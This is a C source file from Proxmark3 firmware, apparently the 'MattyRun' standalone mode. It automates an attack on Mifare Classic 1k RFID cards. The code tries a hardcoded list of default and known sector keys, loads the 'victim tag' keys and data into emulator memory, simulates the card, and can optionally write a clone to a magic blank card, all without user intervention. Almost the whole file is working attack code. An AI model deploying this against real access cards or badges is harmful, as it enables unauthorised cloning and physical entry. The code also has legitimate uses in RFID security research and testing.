//-----------------------------------------------------------------------------
// Matías A. Ré Medina 2016
// Christian Herrmann, 2018
//
// This code is licensed to you under the terms of the GNU GPL, version 2 or,
// at your option, any later version. See the LICENSE.txt file for the text of
// the license.
//-----------------------------------------------------------------------------
// main code for HF aka MattyRun by Matías A. Ré Medina
//-----------------------------------------------------------------------------
/*
### What I did:
I've personally recoded the image of the ARM in order to automate
the attack and simulation on Mifare cards. I've moved some of the
implementation on the client side to the ARM such as *chk*, *ecfill*, *sim*
and *clone* commands. 

### What it does now:
It will check if the keys from the attacked tag are a subset from
the hardcoded set of keys inside of the FPGA. If this is the case
then it will load the keys into the emulator memory and also the
content of the victim tag, to finally simulate it and make a clone
on a blank card.

#### TODO:
- Nested attack in the case not all keys are known.
- Dump into magic card in case of needed replication.

#### ~ Basically automates commands without user intervention.
#### ~ No need of interface.
#### ~ Just a portable battery or an OTG usb cable for power supply.

## Spanish full description of the project [here](http://bit.ly/2c9nZXR).
*/

#include "hf_mattyrun.h"

void RunMod() {
	StandAloneMode();
	
	/*
		It will check if the keys from the attacked tag are a subset from
		the hardcoded set of keys inside of the ARM. If this is the case
		then it will load the keys into the emulator memory and also the
		content of the victim tag, to finally simulate it.

		Alternatively, it can be dumped into a blank card.

		This source code has been tested only in Mifare 1k.

		If you're using the proxmark connected to a device that has an OS, and you're not using the proxmark3 client to see the debug
		messages, you MUST uncomment usb_disable().
	*/

    FpgaDownloadAndGo(FPGA_BITSTREAM_HF);
    // usb_disable(); // Comment this line if you want to see debug messages.


    /*
		Pseudo-configuration block.
    */
	char keyTypec = '?'; // 'A'/'B' or both keys '?'
	bool printKeys = false; // Prints keys
	bool transferToEml = true; // Transfer keys to emulator memory
	bool ecfill = true; // Fill emulator memory with cards content.
	bool simulation = true; // Simulates an exact copy of the target tag
	bool fillFromEmulator = false; // Dump emulator memory.


	uint16_t mifare_size = 1024; // Mifare 1k (only 1k supported for now)
	uint8_t sectorSize = 64; // 1k's sector size is 64 bytes.
	uint8_t blockNo = 3; // Security block is number 3 for each sector.
	uint8_t sectorsCnt = (mifare_size/sectorSize);
	uint8_t keyType; // Keytype buffer
	uint64_t key64; // Defines current key
	uint8_t *keyBlock = NULL; // Where the keys will be held in memory.
	uint8_t stKeyBlock = 20; // Set the quantity of keys in the block.
	uint8_t filled = 0; // Used to check if the memory was filled with success.
	bool keyFound = false;

	/*
		Set of keys to be used.
	*/
	uint64_t mfKeys[] = {
		0xffffffffffff, // Default key
		0x000000000000, // Blank key
		0xa0a1a2a3a4a5, // NFCForum MAD key
		0xb0b1b2b3b4b5,
		0xaabbccddeeff,
		0x4d3a99c351dd,
		0x1a982c7e459a,
		0xd3f7d3f7d3f7,
		0x714c5c886e97,
		0x587ee5f9350f,
		0xa0478cc39091,
		0x533cb6c723f6,
		0x8fd0a4f256e9,
	};

	/*
		This part allocates the byte representation of the
		keys in keyBlock's memory space .
	*/
	keyBlock = BigBuf_malloc(stKeyBlock * 6);
	int mfKeysCnt = sizeof(mfKeys) / sizeof(uint64_t);

	for (int mfKeyCounter = 0; mfKeyCounter < mfKeysCnt; mfKeyCounter++) {
		num_to_bytes(mfKeys[mfKeyCounter], 6, (uint8_t*)(keyBlock + mfKeyCounter * 6));
	}

	/*
		Simple switch just to handle keytpes.
	*/
	switch (keyTypec) {
	case 'a': case 'A':
		keyType = !0;
		break;
	case 'b': case 'B':
		keyType = !1;
		break;
	case '?':
		keyType = 2;
		break;
	default:
		Dbprintf("[!] Key type must be A , B or ?");
		keyType = 2;
	}

	/*
		Pretty print of the keys to be checked.
	*/
	if (printKeys) {
		Dbprintf("[+] Printing mf keys");
		for (uint8_t keycnt = 0; keycnt < mfKeysCnt; keycnt++)
			Dbprintf("[-] chk mf key[%2d] %02x%02x%02x%02x%02x%02x", keycnt,
				(keyBlock + 6*keycnt)[0],(keyBlock + 6*keycnt)[1], (keyBlock + 6*keycnt)[2],
				(keyBlock + 6*keycnt)[3], (keyBlock + 6*keycnt)[4],	(keyBlock + 6*keycnt)[5], 6);
		DbpString("--------------------------------------------------------");
	}

	/*
		Initialization of validKeys and foundKeys storages.
		- validKey will store whether the sector has a valid A/B key.
		- foundKey will store the found A/B key for each sector.
	*/
	bool validKey[2][40];
	uint8_t foundKey[2][40][6];
	for (uint16_t t = 0; t < 2; t++) {
		for (uint16_t sectorNo = 0; sectorNo < sectorsCnt; sectorNo++) {
			validKey[t][sectorNo] = false;
			for (uint16_t i = 0; i < 6; i++) {
				foundKey[t][sectorNo][i] = 0xff;
			}
		}
	}

	/*
		Iterates through each sector checking if there is a correct key.
	*/
	int key = -1;
	int block = 0;
	bool err = 0;
	bool allKeysFound = true;
	uint32_t size = mfKeysCnt;
	for (int type = !keyType; type < 2 && !err; keyType == 2 ? (type++) : (type = 2)) {
		block = blockNo;
		for (int sec = 0; sec < sectorsCnt && !err; ++sec) {
			Dbprintf("\tCurrent sector:%3d, block:%3d, key type: %c, key count: %i ", sec, block, type ? 'B':'A', mfKeysCnt);
			key = saMifareChkKeys(block, type, true, size, &keyBlock[0], &key64);
			if (key == -1) {
				LED(LED_RED, 50); //red
				Dbprintf("\t✕ Key not found for this sector!");
				allKeysFound = false;
				// break;
			} else if (key == -2) {
				err = 1; // Can't select card.
				break;
			} else {
				num_to_bytes(key64, 6, foundKey[type][sec]);
				validKey[type][sec] = true;
				keyFound = true;
				Dbprintf("\t✓ Found valid key: [%02x%02x%02x%02x%02x%02x]\n", (keyBlock + 6*key)[0],(keyBlock + 6*key)[1], (keyBlock + 6*key)[2],(keyBlock + 6*key)[3], (keyBlock + 6*key)[4], (keyBlock + 6*key)[5], 6);
			}
		block < 127 ? (block += 4) : (block += 16);
		}
	}


	/*
		TODO: This.

		If at least one key was found, start a nested attack based on that key, and continue.
	*/
	if (!allKeysFound && keyFound) {
		Dbprintf("\t✕ There's currently no nested attack in MattyRun, sorry!");
		LED_C_ON(); //red
		LED_A_ON(); //yellow
		// Do nested attack, set allKeysFound = true;
		// allKeysFound = true;
	} else {
		Dbprintf("\t✕ There's nothing I can do without at least a one valid key, sorry!");
		LED_C_ON(); //red
	}


	/*
		If enabled, transfers found keys to memory and loads target content in emulator memory. Then it simulates to be the tag it has basically cloned.
	*/
	if ((transferToEml) && (allKeysFound)) {
		emlClearMem();
		uint8_t mblock[16];
		for (uint16_t sectorNo = 0; sectorNo < sectorsCnt; sectorNo++) {
			if (validKey[0][sectorNo] || validKey[1][sectorNo]) {
				emlGetMem(mblock, FirstBlockOfSector(sectorNo) + NumBlocksPerSector(sectorNo) - 1, 1); // data, block num, blocks count (max 4)
					for (uint16_t t = 0; t < 2; t++) {
						if (validKey[t][sectorNo]) {
							memcpy(mblock + t*10, foundKey[t][sectorNo], 6);
						}
					}
					emlSetMem(mblock, FirstBlockOfSector(sectorNo) + NumBlocksPerSector(sectorNo) - 1, 1);
				}
			}
		Dbprintf("\t✓ Found keys have been transferred to the emulator memory.");
		if (ecfill) {
			Dbprintf("\tFilling in with key A.");
			MifareECardLoad(sectorsCnt, 0, 0, &filled);
			if (filled != 1) {
				Dbprintf("\t✕ Failed filling with A.");
			}
			Dbprintf("\tFilling in with key B.");
			MifareECardLoad(sectorsCnt, 1, 0, &filled);
			if (filled != 1) {
				Dbprintf("\t✕ Failed filling with B.");
			}
			if ((filled == 1) && simulation) {
				Dbprintf("\t✓ Filled, simulation started.");
				// This will tell the fpga to emulate using previous keys and current target tag content.
				Dbprintf("\t Press button to abort simulation at anytime.");
				LED_B_ON(); //green
				Mifare1ksim(0, 0, 0, NULL);
				LED_B_OFF();

				/*
					Needs further testing.
				*/
				if (fillFromEmulator) {
					uint8_t retry = 5, cnt;
					Dbprintf("\t Trying to dump into blank card.");
					int flags = 0;
					LED_A_ON(); //yellow
					for (int blockNum = 0; blockNum < 16 * 4; blockNum += 1) {
						cnt = 0;
						emlGetMem(mblock, blockNum, 1);
						// switch on field and send magic sequence
						if (blockNum == 0) flags = 0x08 + 0x02;

						// just write
						if (blockNum == 1) flags = 0;

						// Done. Magic Halt and switch off field.
						if (blockNum == 16 * 4 - 1) flags = 0x04 + 0x10;

						while (!saMifareCSetBlock(0, flags & 0xFE, blockNum, mblock) && cnt <= retry) {
							cnt++;
							Dbprintf("\t! Could not write block. Retrying.");
						}
						if (cnt == retry) {
							Dbprintf("\t✕ Retries failed. Aborting.");
							break;
						}
					}

					if (!err) {
						LED_B_ON();
					} else {
						LED_C_ON();
					}

				}
			} else if (filled != 1) {
				Dbprintf("\t✕ Memory could not be filled due to errors.");
				LED_C_ON();
			}
		}
	}	
}